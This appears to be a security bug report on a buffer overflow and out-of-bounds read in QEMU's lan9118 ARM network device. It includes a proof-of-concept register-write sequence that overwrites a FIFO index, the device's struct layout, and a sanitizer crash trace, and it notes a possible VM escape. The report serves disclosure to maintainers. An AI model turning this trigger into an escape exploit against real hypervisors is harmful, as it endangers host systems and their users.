# Buffer overflow and out-of-bounds read in lan9118 NIC

# Buffer overflow and out-of-bounds read in lan9118 NIC for ARM

There is a buffer overflow in tx_fifo_push in lan9118 NIC for ARM causing an
out-of-bounds read of tx_status_fifo. The write and read primitives are so
powerful that they can likely be abused to escape the VM.

## Read primitive
In tx_status_fifo_pop, there is an out-of-bounds read at the line:
val = s->tx_status_fifo[s->tx_status_fifo_head];
because there is an overwrite of s->tx_status_fifo_head.

Security Impact: because s->tx_status_fifo_head is int32, so this read primitive
seems powerful.

## Buffer overflow and the write primitive

In tx_fifo_push, there are three states for tx_fifo: TX_IDLE, TX_B, TX_DATA.
However, because of the lack of the check of s->txp->len, we can visit
TX_IDLE->TX_B->TX_DATA many times to overflow s->txp->data whose size is only
2048 then overwrite s->tx_status_fifo_head.

This can be done like below. (Suppose the hardware address of lan9118 is 0x5000000.)

First, the max size of the buffer you can write once is 0x800. The pattern is in
the following.

	writel 0x5000020 0x800 // 0x800 bytes buffer you’d like to write
	writel 0x5000020 0x0
	writel 0x5000020 0x0 … (0x200 times) // issue 0x800 / 4 times

Second, repeat the first step (change the size of the buffer you’d like to
write) and reach where you’d like to overwrite.

```
    LAN9118Packet tx_packet;     // last field: data[2048]
    int32_t tx_status_fifo_used;
    int32_t tx_status_fifo_head; // overwrite this
    uint32_t tx_status_fifo[512];
```

If I’d like to overwrite tx_status_fifo_head, then I should issue instructions
in the following.

writel 0x5000020 0x8
writel 0x5000020 0x0
writel 0x5000020 0xaabbccdd // overwrite tx_status_fifo_used
writel 0x5000020 0xddccbbaa // overwrite tx_stats_fifo_head

Security Impact: Because we can repeat the first step without limit, this write
primitive seems very powerful.


## More details

### Hypervisor, hypervisor version, upstream commit/tag, host

qemu, 6.1.50, c52d69e7dbaaed0ffdef8125e79218672c30161d, Ubuntu 18.04

### VM architecture, device, device type

arm, lan9118, net

### Bug Type: Buffer Overflow; Out-of-bounds Read

### Stack traces, crash details

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==426==ERROR: AddressSanitizer: SEGV on unknown address 0x62cf773fa008 (pc 0x561e8635387a bp 0x7fff71ca92a0 sp 0x7fff71ca9260 T0)
==426==The signal is caused by a READ memory access.
    #0 0x561e8635387a in tx_status_fifo_pop /root/qemu/build-oss-fuzz/../hw/net/lan9118.c:730:11
    #1 0x561e86352b79 in lan9118_readl /root/qemu/build-oss-fuzz/../hw/net/lan9118.c:1249:16
    #2 0x561e86aea48c in memory_region_read_accessor /root/qemu/build-oss-fuzz/../softmmu/memory.c:442:11
    #3 0x561e86ad2895 in access_with_adjusted_size /root/qemu/build-oss-fuzz/../softmmu/memory.c:552:18
    #4 0x561e86ad2895 in memory_region_dispatch_read1 /root/qemu/build-oss-fuzz/../softmmu/memory.c:1422:16
    #5 0x561e86ad2895 in memory_region_dispatch_read /root/qemu/build-oss-fuzz/../softmmu/memory.c:1450:9
    #6 0x561e86971a83 in flatview_read_continue /root/qemu/build-oss-fuzz/../softmmu/physmem.c:2810:23
    #7 0x561e86a2cf0a in address_space_read /root/qemu/include/exec/memory.h:2518:26
    #8 0x561e86a2cf0a in qtest_process_command /root/qemu/build-oss-fuzz/../softmmu/qtest.c:568:13
    #9 0x561e86a2cf0a in qtest_process_inbuf /root/qemu/build-oss-fuzz/../softmmu/qtest.c:797:9
    #10 0x561e86c15d5b in fd_chr_read /root/qemu/build-oss-fuzz/../chardev/char-fd.c:68:9
    #11 0x7f0e3bfa23a4 in g_main_context_dispatch (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4c3a4)
    #12 0x561e8707e8e7 in glib_pollfds_poll /root/qemu/build-oss-fuzz/../util/main-loop.c:231:9
    #13 0x561e8707e8e7 in os_host_main_loop_wait /root/qemu/build-oss-fuzz/../util/main-loop.c:254:5
    #14 0x561e8707e8e7 in main_loop_wait /root/qemu/build-oss-fuzz/../util/main-loop.c:530:11
    #15 0x561e86b38138 in qemu_main_loop /root/qemu/build-oss-fuzz/../softmmu/runstate.c:725:9
    #16 0x561e85ac86a5 in main /root/qemu/build-oss-fuzz/../softmmu/main.c:50:5
    #17 0x7f0e3ada2bf6 in __libc_start_main /build/glibc-S9d2JN/glibc-2.27/csu/../csu/libc-start.c:310
    #18 0x561e859ef589 in _start (/root/qemu/build-oss-fuzz/qemu-system-arm+0x1108589)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /root/qemu/build-oss-fuzz/../hw/net/lan9118.c:730:11 in tx_status_fifo_pop
==426==ABORTING
```

## Contact

Let us know if I need to provide more information.
